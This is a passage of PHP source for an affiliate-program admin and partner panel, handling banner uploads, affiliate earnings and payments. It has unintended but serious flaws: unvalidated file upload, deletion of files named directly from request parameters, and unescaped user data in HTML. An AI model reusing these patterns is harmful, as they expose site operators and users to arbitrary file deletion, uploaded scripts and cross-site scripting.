						<h4 class="modal-title">Information about Partner</h4>
					</div>
					<div class="modal-body"></div>
					<div class="modal-footer">
						<button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
					</div>
				</div>
			</div>
		</div>';

		// attach js code and events 
		$html .= $this->js_events('admin');

		return $html;
	}

	function generate_affiliates_table($affiliates, $affiliates_orders)
	{
		$html = '<tbody>';
		foreach($affiliates as $k=>$v)
		{
			$unpaid = $this->calculateAffiliateEarnings($v['id'], 'unpaid');
			$table_row_class = $unpaid >= $v['min_payment'] ? 'warning' : '';
			$aff_orders = isset($affiliates_orders[$v['id']]['COUNT(tor.`id`)']) ? $affiliates_orders[$v['id']]['COUNT(tor.`id`)'] : 0;
			$html .= '<tr class="'.$table_row_class.'">
				<td>'.$v['id'].'</td>
				<td>'.$v['name'].'</td>
				<td>'.$v['email'].'</td>
				<td>'.$aff_orders.'</td>
				<td>'.round($unpaid, 2).$this->easy_aff_currency.'</td>
				<td align="center"><span class="glyphicon glyphicon-cog show_aff_details" id-aff="'.$v['id'].'"></span></td>
			</tr>';
		}
		$html .= '</tbody>';

		return $html;
	}

	/*
	* organize banners page
	* entry for both affialite and admin
	*/
	function panel_Banners()
	{
		// in case the affilaite is open the banner page
		if( isset($_SESSION['easy_affiliate_user']) )
		{
			return $this->panel_Banners_affilaite();
		}

		if(isset($_GET['ajax']) && $_GET['ajax_mode'] == 'delete_banner')
		{
			$name = $_GET['banner'];
			unlink($this->banner_destination.$name);
		}
		elseif( !empty($_POST) )
		{
			// the admin is uploading new banner	
			if(!empty( $_FILES ))
			{
				$filename = $_FILES['affiliate_banner']['name'];
				$target_images = $this->banner_destination.$filename;
				$upload_file = move_uploaded_file($_FILES['affiliate_banner']['tmp_name'], $target_images);
			}
		}

		$html = $this->panel_Navigation('admin');

		$banners = scandir($this->banner_destination);
		$html .= '<br /><div class="panel panel-default">
			<div class="panel-body">
			<button type="button" class="btn btn-primary" data-toggle="modal" data-target=".bs-example-modal-upload">Add New</button>
			<ul class="banners_list">';

		foreach($banners as $k=>$v)
		{
			if( $v == '.' || $v == '..' || $v == '.DS' )
				continue;

			$banner_data = getimagesize($this->banner_destination.$v);
			$html .= '<li banner-name="'.$v.'">
				<p>Name: <b>'.$v.'</b>, Dimensions: <b>'.$banner_data[0].'x'.$banner_data[1].'</b><span class="delete">Delete</span></p>
				<img src="'.$this->banner_destination.$v.'" alt="" class="img-rounded" />
			</li>';
		}

		$html .= '</ul><br />
		<button type="button" class="btn btn-primary" data-toggle="modal" data-target=".bs-example-modal-upload">Add New</button>
		</div></div>';	
		// html modal delete banner
		$html .= '<div class="modal fade bs-example-modal-sm" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
	  		<div class="modal-dialog modal-sm">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title" id="myModalLabel">Delete banner</h4>
					</div>
					<div class="modal-body">Are you sure?</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-primary sure_delete_banner" data-loading-text="Loading...">Yes</button>
			        	<button type="button" class="btn btn-default" data-dismiss="modal">No</button>
			      </div>
				</div>
			</div>
		</div>';
		// html modal upload banner
		$html .= '<div class="modal fade bs-example-modal-upload" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
	  		<div class="modal-dialog modal-upload">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title" id="myModalLabel">Upload banner</h4>
					</div>
					<form method="post" action="'.$_SERVER['REQUEST_URI'].'" enctype="multipart/form-data" >
					<div class="modal-body">
						<input type="file" name="affiliate_banner" id="file" />
						<input type="hidden" name="uploading" value="1" />
					</div>
					<div class="modal-footer">
						<button type="submit" class="btn btn-primary sure_delete_banner" data-loading-text="Loading...">Upload</button>
			        	<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
			      </div>
			      </form>
				</div>
			</div>
		</div>';

		// attach js code and events 
		$html .= $this->js_events('admin_banners');

		return $html;
	}

	/*
	* page with banners for the affiliate
	* the user can choose banner and enter an url and the script 
	* will generate html code for it
	*/
	function panel_Banners_affilaite()
	{
		$html = '';

		$html .= $this->panel_Navigation();

		$banners = scandir($this->banner_destination);
		$html .= '<br /><div class="panel panel-default affiliate_banners">
			<div class="panel-body">
			<p class="lead">Click on a banner to see how to integrate it</p>
			<ul class="banners_list">';

		foreach($banners as $k=>$v)
		{
			if( $v == '.' || $v == '..' || $v == '.DS_Store' )
				continue;

			$banner_data = getimagesize($this->banner_destination.$v);
			$html .= '<li banner-name="'.$v.'">
				<p>Name: <b>'.$v.'</b>, Dimensions: <b>'.$banner_data[0].'x'.$banner_data[1].'</b></p>
				<img src="'.$this->root.$this->banner_destination.$v.'" alt="" class="img-rounded" />
			</li>';
		}

		$aff_link = $this->main_site_url !== false ? $this->main_site_url : $this->root;
		$aff_link .= '?aff='.$_SESSION['easy_affiliate_user']['id'];
		$html_code = '';//'<a href=""><img src="" /></a>';

		$html .= '</ul><br />
		</div></div>';	
		$html .= '<div class="modal fade bs-modal-get-html" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
	  		<div class="modal-dialog modal-get-html">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title" id="myModalLabel">Generate HTML code</h4>
					</div>
					<div class="modal-body">
						<form role="form">
							<div class="form-group">
								<label class="control-label">Chosen Banner</label>
								<p class="form-control-static banner_preview"><img class="banner_image" src="" alt="" /></p>
							</div>
							<div class="form-group">
								<label for="inputLink" class="control-label">Link</label>
								<input type="text" class="form-control" value="'.$aff_link.'" id="inputLink" placeholder="">
							</div>
							<div class="form-group">
								<label for="html_code" class="control-label">HTML code</label>
								<textarea id="html_code" class="form-control" rows="3">'.$html_code.'</textarea>
							</div>
							 <button type="button" id="generate_html_code" class="btn btn-primary">Generate</button>
						</form>
					</div>
					<div class="modal-footer">
			        	<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
			      </div>
				</div>
			</div>
		</div>';

		// attach js code and events 
		$html .= $this->js_events('aff_banners');

		return $html;
	}

	function panel_AJAX()
	{
		$json = array();
		if(isset($_POST['id_affiliate']))
			$id_affiliate = (int)$_POST['id_affiliate'];

		if( $this->mode == 'aff_details' )
		{
			$json['data'] = $this->SqlQuery("SELECT `id`, `name`, `email`, `cookie_duration`, `percent`, `min_payment`, `payment_comments` FROM `".$this->table_users."` 
				WHERE `id`=$id_affiliate");
			$json['data'] = current($json['data']);
			$json['total_earnings'] = $this->calculateAffiliateEarnings($id_affiliate, 'total');
			$json['unpaid'] = $this->calculateAffiliateEarnings($id_affiliate, 'unpaid');

			$json['stats'] = $this->panel_Stats($json['data'], false);

			$html = $this->generateDetailsPage($json);
		}
		elseif($this->mode == 'save_main')
		{
			$aff_cookie = (int)$_POST['aff_cookie'];
			$aff_percent = (int)$_POST['aff_percent'];

			$q = $this->SqlQuery("UPDATE `".$this->table_users."` SET `cookie_duration`=$aff_cookie, `percent`=$aff_percent WHERE `id`=".$id_affiliate);
			if($q == true)
				$html =  1;
			else
				$html = 0;
		}
		elseif($this->mode == 'save_payment')
		{
			$mark_sum_paid = mysql_real_escape_string($_POST['mark_sum_paid']);
			$comments = mysql_real_escape_string($_POST['comments']);

			$q = $this->SqlQuery("INSERT INTO `".$this->table_paid_affiliates."` (`id_affiliate`, `sum`, `comment`, `date`) 
				VALUES($id_affiliate, '$mark_sum_paid', '$comments', NOW() )");
			$html = array();
			if($q == true)		
			{	
				$html['unpaid_earnings'] = $this->calculateAffiliateEarnings($id_affiliate, 'unpaid');
				$html['result'] = 1;
			}
			else
				$html['result'] = 0;


			$html = json_encode($html);
		}
		elseif($this->mode == 'show_dates')
		{
			$aff_data = $this->SqlQuery("SELECT * FROM `".$this->table_users."` WHERE `id`=$id_affiliate");
			$aff_data = current($aff_data);

			$date_from = $_POST['date_from'];
			$date_to = $_POST['date_to'];

			// to get $stats and $orders
			extract( $this->getStats_n_Orders($date_from, $date_to, $aff_data) );
			$html = $this->generate_stats_table_body($stats, $orders, $aff_data);
		}
		elseif($this->mode == 'search_affiliates')
		{
			$search = mysql_real_escape_string($_POST['search']);
			$aff = $this->SqlQuery($q="SELECT DISTINCT `id`, `name`, `email` FROM `".$this->table_users."` WHERE `name` LIKE '$search%' OR `email` LIKE '$search%' ORDER BY `name` ASC ", 'id');
			
			if( !empty($aff) )
			{
				$id_affs = array_keys($aff);
				$orders = $this->SqlQuery($q="SELECT tor.`id_affiliate`, COUNT(tor.`id`) FROM `".$this->table_orders."` as tor 
	         WHERE tor.`is_paid`=1 AND `id_affiliate` IN (".implode(',', $id_affs).") ", 'id_affiliate');
				$html = $this->generate_affiliates_table($aff, $orders);
			}
			else
				$html = '<tbody></tbody>';
			

		}
		
		return $html;
	}

	function generateDetailsPage($info)
	{
		$html = '';

		$main = '<table class="table table-bordered">
			<tr><td>ID</td><td id="id_affiliate">'.$info['data']['id'].'</td></tr>
			<tr><td>Name</td><td>'.$info['data']['name'].'</td></tr>
			<tr><td>E-mail</td><td>'.$info['data']['email'].'</td></tr>
			<tr><td>Cookie Duration</td><td>
				<div class="input-group col-xs-8">
					<input type="text" class="form-control" name="aff_cookie" value="'.$info['data']['cookie_duration'].'" />
					<span class="input-group-addon">sec.</span>
				</div>
			</td></tr>
			<tr><td>Percent from purchase</td><td>
				<div class="input-group col-xs-5">
					<input type="text" class="form-control" name="aff_percent" size="4" value="'.$info['data']['percent'].'" />
					<span class="input-group-addon">%</span>
				</div>
			</td></tr>
			<tr><td>Minimum payment sum</td><td>'.$info['data']['min_payment'].$this->easy_aff_currency.'</td></tr>
			<tr><td>Minimum payment comments</td><td>'.$info['data']['payment_comments'].'</td></tr>
			<tr><td></td><td><span id="save_main" class="btn btn-success">Save</span></td></tr>
		</table>';

		$earnings = '<table class="table table-bordered">
			<tr><td>Unpaid earnings</td><td class="aff_unpaid_earnings">'.$info['unpaid'].$this->easy_aff_currency.'</td></tr>
			<tr><td>Total Earnings</td><td>'.$info['total_earnings'].$this->easy_aff_currency.'</td></tr>
			<tr><td>Mark sum as paid</td><td>
				<div class="input-group col-xs-8">
					<input type="text" class="form-control" name="mark_sum_paid" value="" />
					<span class="input-group-addon">'.$this->easy_aff_currency.'</span>
				</div>
			</td></tr>
			<tr><td>Comments about the marked paid sum</td><td>
				<div class="input-group col-xs-12">
					<textarea name="comments" class="form-control"></textarea>
				</div>
			</td></tr>
			<tr><td></td><td><span id="save_payment" class="btn btn-success">Save</span></td></tr>
		</table>';

		$paid_earnings = $this->SqlQuery("SELECT * FROM `".$this->table_paid_affiliates."` WHERE `id_affiliate`=".$info['data']['id']." ORDER BY `date` DESC ");

		$history = '';
		foreach($paid_earnings as $k=>$v)
		{
			$history .= '<tr>
			<td>'.$v['sum'].$this->easy_aff_currency.'</td>
			<td>'.$v['comment'].'</td>
			<td>'.date('d.m.Y', strtotime($v['date']) ).'</td>
			</tr>';
		}

		$history = '<table class="table table-bordered">
			<tr>
				<th>Sum</th>
				<th>Comment</th>
				<th>Date</th>
			</tr>'.$history.'
		</table>';

		$stats = $info['stats'];

		// menu with tabs
		$html .= '<ul class="nav nav-tabs">
		  	<li class="active"><a href="#info" data-toggle="tab">Information</a></li>
		  	<li><a href="#earnings" data-toggle="tab">Earnings</a></li>
		  	<li><a href="#history" data-toggle="tab">Payments History</a></li>
		  	<li><a href="#stats" data-toggle="tab">Stats</a></li>
		</ul>';
		// contents
		$html .= '<div class="tab-content">
			<div class="tab-pane fade in active" id="info">'.$main.'</div>
		  	<div class="tab-pane fade" id="earnings">'.$earnings.'</div>
		  	<div class="tab-pane fade" id="history">'.$history.'</div>
		  	<div class="tab-pane fade" id="stats">'.$stats.'</div>
		</div>';

		$html .= $this->js_events('aff_details');
		return $html;
	}

	function panel_Header($framed)
	{
		$html = '';

		if($framed == false)
		{
			$html .= '<html>
			<head>
				<title>Become a Partner - Elektropay</title>
				<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
			</head>
			<body class="easy_affiliate_body">';
		}

		$html .= '<div id="easy_aff_header" class="navbar page-header navbar-inverse navbar-static-top" role="navigation" />';
$html .= '<div class="container" />';
		$html .= '<div class="logo_html">';
		if(!empty($this->logo_image))
		$html .= '<img src="'.$this->logo_image.'" alt="Elektropay" width="144" height="58" />';
		if(!empty($this->logo_text))
			$html .= '<h1>'.$this->logo_text.'</h1>';

		$html .= '</div>';

		if( isset($_SESSION['easy_affiliate_user']) )
		{
			$html .= '<div id="user_welcome">';
			$html .= '<span class="welcome_row">Welcome <b>'.$_SESSION['easy_affiliate_user']['name'].' (ID '.$_SESSION['easy_affiliate_user']['id'].')</b>';
			$html .= '<a href="'.$this->root.$this->panel_page.'?mode=logout"><button type="button" class="btn btn-danger">Sign Out</button></a>';
			$html .= '</span>';
			$html .= '<span class="unpaid_earnings">Unpaid Earnings: <b>'.$this->calculateAffiliateEarnings($_SESSION['easy_affiliate_user']['id'], 'unpaid').$this->easy_aff_currency.'</b></span>';
			$html .= '<span class="total_earnings">Total Earnings: <b>'.$this->calculateAffiliateEarnings($_SESSION['easy_affiliate_user']['id'], 'total').$this->easy_aff_currency.'</b></span>';
			$html .= '</div>';
		}
		elseif(isset($_SESSION['easy_affiliate_admin']))
		{
			$html .= '<div id="user_welcome">';
			$html .= '<span class="welcome_row">Welcome <b>'.$this->admin_user.'</b>';
			$html .= '<a href="'.$this->root.$this->panel_page.'?mode=logout"><i class="fa fa-power-off"></i> Sign out</a>';
			$html .= '</span>';
			$html .= '</div>';
		}
		
		$html .= '</div>';
$html .= '</div>';

		return $html;
	}

	// output javascript code 
	function js_events($page)
	{
		$html = '';
		
		if($page == 'stats')
		{
			$html .= '<link href="'.$this->root.'easy_affiliate_files/css/datepicker.css" rel="stylesheet" />';
			$html .= '<script src="'.$this->root.'easy_affiliate_files/js/bootstrap-datepicker.js" type="text/javascript"></script>';
			$html .= '<script type="text/javascript">';
			$html .= "$(function(){
				$('#date_from,#date_to').datepicker({
					format: 'dd.mm.yyyy', 
					weekStart: 1
				}).on('changeDate', function(ev){ $(this).datepicker('hide'); });
			})";
			$html .= '</script>';
		}
		elseif( $page == 'admin' )
		{
			$html .= '<script type="text/javascript">';
			$html .= "$(function(){
				$('[name=aff_name]').keyup(function(){
					var obj = this;
					var search = $(obj).val();

					$('#ajax_loader').remove();
					$(obj).parent().after('<img src=\'easy_affiliate_files/ajax-loader.gif\' id=\'ajax_loader\' />');
					$('#ajax_loader').css('margin-left', $(obj).parent().width() + 14 ).css('margin-top', '-' + ( $(obj).parent().height() - 8 ) );
					
					$.post(window.location.href, {ajax: 1, mode: 'search_affiliates', search: search }, function(data){
						$('#ajax_loader').remove();
						$('.affs_n_orders').find('tbody').replaceWith(data);
					});
				});

				$('.show_aff_details').click(function(){
					var obj = this;
					$.post(window.location.href, {ajax: 1, mode: 'aff_details', id_affiliate: $(this).attr('id-aff') }, function(data){
						$('#details_window').find('.modal-body').html(data);
						$('#details_window').modal({show: true, keyboard: true});
						$('#details_window').attr( 'id_affiliate', $(obj).attr('id-aff') );
					});
				});
			})";
			$html .= '</script>';
			$html .= '';
		}
		elseif( $page == 'admin_banners' )
		{
			$html .= '<script type="text/javascript">';
			$html .= "$(function(){
				$('.banners_list').find('.delete').click(function(){
					var modal_selector = '.bs-example-modal-sm';
					var delete_button = this;
				
					// revert mode's html to basic
					$(modal_selector).find('.modal-footer').html('<button type=\'button\' class=\'btn btn-primary sure_delete_banner\' data-loading-text=\'Loading...\'>Yes</button><button type=\'button\' class=\'btn btn-default\' data-dismiss=\'modal\'>No</button>');
					$(modal_selector).find('.modal-body').html('Are you sure?');

					$(modal_selector).find('.sure_delete_banner').attr('banner-name', $(this).parents('li').attr('banner-name') );

					$(modal_selector).modal();
					$('.sure_delete_banner').unbind('click').click(function(){
						var btn = $(this);
						var banner = $(this).attr('banner-name');
						btn.button('loading');
						$.get(window.location.href, {ajax: 1, ajax_mode: 'delete_banner', banner: banner}, function(data){
							btn.button('reset');	
							$(modal_selector).find('.modal-body').html('The selected banner was successfully deleted!');
							$(modal_selector).find('.modal-footer').html('<button data-dismiss=\'modal\' class=\'btn btn-success\' type=\'button\' >Close</button>');
							$(delete_button).parents('li').remove();
						});
					});
				})
			});";
			$html .= '</script>';
		}
		elseif( $page == 'aff_banners' )
		{
			$html .= '<script type="text/javascript">';
			$html .= 'var aff_id='.$_SESSION['easy_affiliate_user']['id'].';'."\n";
			$html .= "$(function(){
				$('.banners_list').find('li').find('img').click(function(){
					var modal_selector = '.bs-modal-get-html';
					$(modal_selector).find('.modal-body').find('img.banner_image').attr('src', $(this).attr('src') );
					$(modal_selector).modal();
				});
				$('#html_code').click(function(){
					$(this).select();
				});
				$('#generate_html_code').click(function(){
					updateAffLink();
				});
			});";
			$html .= "function updateAffLink()
			{
				var aff_link = $('#inputLink').val();
				// check if the link has the aff id in it

				var expression = 'aff='+ aff_id;
				if( aff_link.match(expression) == null) // add the affilaite id
				{
					if( aff_link.match(/\?[a-zA-Z]+=/g) == null )
						aff_link += '?';
					else
						aff_link += '&';

					aff_link += 'aff=' + aff_id
				}

				var banner_link = $('.modal-get-html').find('.banner_image').attr('src');
				var html_code = '<a href=\"' + aff_link + '\"><img src=\"'+ banner_link +'\" alt=\"\" /></a>';

				$('#html_code').val(html_code);
			}
			";
			$html .= '</script>';
		}
		elseif( $page == 'aff_details' )
		{
			$html .= '<link href="'.$this->root.'easy_affiliate_files/css/datepicker.css" rel="stylesheet" />';
			$html .= '<script src="'.$this->root.'easy_affiliate_files/js/bootstrap-datepicker.js" type="text/javascript"></script>';
			$html .= '<script type="text/javascript">';
			$html .= "$(function(){

				$('#save_main').on('click', function(){
					$.post(window.location.href, {ajax: 1, mode: 'save_main', id_affiliate: $('#details_window').attr('id_affiliate'), aff_cookie: $('[name=aff_cookie]').val(), aff_percent: $('[name=aff_percent]').val() }, function(data){
						showResult(data, 'save_main');
					});
				});

				$('#save_payment').on('click', function(){
					$.post(window.location.href, {ajax: 1, mode: 'save_payment', id_affiliate: $('#details_window').attr('id_affiliate'), mark_sum_paid: $('[name=mark_sum_paid]').val(), comments: $('[name=comments]').val() }, function(data){
						data = $.parseJSON(data)
						showResult(data.result, 'save_payment');
						$('.aff_unpaid_earnings').html(data.unpaid_earnings + '".$this->easy_aff_currency."');
					})
				});				

				$('.calendars').find('.btn-success').on('click', function(e){
					e.preventDefault();
					
					var date_from = $('#date_from').val();
					var date_to = $('#date_to').val();
					$.post(window.location.href, {ajax: 1, mode: 'show_dates', id_affiliate: $('#details_window').attr('id_affiliate'), date_from: date_from, date_to: date_to }, function(data){
						$('#details_window').find('.stats_n_orders').find('tbody').replaceWith(data);
					});

					return false;
				})

				
				$('#details_window').find('#date_from,#date_to').datepicker({
					format: 'dd.mm.yyyy', 
					weekStart: 1
				}).on('changeDate', function(ev){ $(this).datepicker('hide'); });	
				$('.datepicker.dropdown-menu').css('z-index', $('#details_window').css('z-index') + 1 );
				
			})	

			function showResult(data, mode)
			{
				$('#ajax_result').remove();
				if(data == 1)
					$('#' + mode).after('<br /><b id=\'ajax_result\'>Changes are saved!</b>');	
				else
					$('#' + mode).after('<br /><b id=\'ajax_result\'>Please try again!</b>');	
			}

			";
			$html .= '</script>';
		}
		

		return $html;
	}

	/*
	* see how much money the affilaite has earned
	* $type can be 
	* - 'total' = calculate the sum of all earnings
	* - 'unpaid' = calculate only the unpaid earnings
	* - 'is_payout' = calculate the unpaid and check if the affilaite have reached the sum for paying out
	*/
	function calculateAffiliateEarnings($id_affiliate, $type)
	{
		$earnings = 0;

		$id_affiliate = (int)$id_affiliate;
		$aff_data = $this->SqlQuery("SELECT * FROM `".$this->table_users."` WHERE `id`=$id_affiliate");
		$aff_data = current($aff_data);
		if(empty($aff_data))
			return false;

		$total_earnings = $this->SqlQuery("SELECT SUM(`price`) FROM `".$this->table_orders."` WHERE `id_affiliate`=$id_affiliate AND `is_paid`=1");
		$total_earnings = current($total_earnings);
		if($type == 'total')
		{
			$earnings = $total_earnings['SUM(`price`)'];
			$earnings = $earnings * $aff_data['percent']/100;
		}
		elseif($type == 'unpaid' || $type == 'is_payout')
		{
			$total_paid = $this->SqlQuery("SELECT SUM(`sum`) FROM `".$this->table_paid_affiliates."` WHERE `id_affiliate`=$id_affiliate ");
			$total_paid = current($total_paid);

			$earnings = ($total_earnings['SUM(`price`)']*($aff_data['percent']/100) ) - $total_paid['SUM(`sum`)'];

			if($type == 'is_payout')
			{
				if( $earnings >= $aff_data['min_payment'] )
					$earnings = array('earnings'=>$earnings, 'aff_data'=>$aff_data);
				else
					$earnings = false;
			}
		}

		return $earnings;
	}

	function getUserIP()
	{
		$user_ip = $_SERVER['REMOTE_ADDR'];
		if($user_ip == '::1')
			$user_ip = '127.0.0.1';

		return $user_ip;
	}

	/*
	* returns this page unique ID
	*/
	function pageID($url = false)
	{
		if($url == false)
		{
			$this->where_string = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
			if(preg_match('/\/\/www\./', $this->where_string) == false)
				$this->where_string = str_replace('http://', 'http://www.', $this->where_string);
			
			$urlid = crc32($this->where_string);
		}
		else
		{
			if(preg_match('/\/\/www\./', $this->where_string) == false)
				$this->where_string = str_replace('http://', 'http://www.', $this->where_string);
			$urlid = crc32($url);
		}

		if( $urlid < 0 )
			$urlid += 2147483647;// 0x100000000;
		return $urlid;
	}

	function sendEasyMail($from, $to, $subject, $msg)
	{
		$headers[] = "Date: ".$this->RFCDate();
		$headers[] = "Return-Path: ".$from;
		$headers[] = "To: ".$to;
		$headers[] = "From: ".$from;

		$headers[] = "Message-ID: <".md5(uniqid(microtime()))."@".$_SERVER['SERVER_NAME'].">";
		$headers[] = "X-Priority: 3";
		$headers[] = "X-Mailer: PHPMailer 3.1";
		$headers[] = "Content-Type: text/html; charset=utf-8";

		mail($to, $subject, $msg, implode("\n", $headers));
	}

	public static function RFCDate()
	{

		$tz = date('Z');
		$tzs = ($tz < 0) ? '-' : '+';
		$tz = abs($tz);
		$tz = (int)($tz/3600)*100 + ($tz%3600)/60;
		$result = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $tzs, $tz);

		return $result;
	}

	function _show_error($string)
	{
		echo '<pre>'; var_dump('Easy Affiliate :: '.$string); echo '</pre>';

		return false;
	}
}


?>